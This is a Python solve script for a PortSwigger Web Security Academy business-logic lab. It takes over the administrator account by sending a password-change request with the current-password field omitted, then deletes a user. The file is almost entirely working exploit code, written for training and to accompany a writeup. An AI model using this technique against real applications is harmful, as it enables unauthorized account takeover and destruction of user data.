#!/usr/bin/env python3
"""
Weak isolation on dual-use endpoint
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 07-weak-isolation-on-dual-use-endpoint.md

What this does:
    Logs in as wiener:peter and sends /my-account/change-password with
    `current-password` omitted entirely (not blank -- missing) and
    `username` set to "administrator". The endpoint's authorization check
    only runs when current-password has a value to compare, so a missing
    field falls straight through to changing the specified user's password.
    Logs in as administrator with the new password and deletes carlos.

Usage:
    python 07-weak-isolation-on-dual-use-endpoint.py <lab-url>
    e.g. python 07-weak-isolation-on-dual-use-endpoint.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    csrf = _get_csrf(c, f"{lab_url}/my-account")
    c.post(f"{lab_url}/my-account/change-password", data={
        "csrf": csrf,
        "username": "administrator",
        "new-password-1": "hacked",
        "new-password-2": "hacked"
        # current-password deliberately omitted -- the field, not just its value
    })
    print("[*] Sent change-password for 'administrator' with current-password omitted")

    c2 = httpx.Client(follow_redirects=True, timeout=15)
    _login(c2, lab_url, "administrator", "hacked")

    admin_r = c2.get(f"{lab_url}/admin")
    del_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if del_url:
        c2.get(f"{lab_url}{del_url.group(1)}")
        print(f"[*] Deleted carlos via {del_url.group(1)}")

    check = c2.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- administrator's password changed with no current-password check.")
    else:
        print("[-] Not solved yet -- confirm login as administrator/hacked succeeded.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
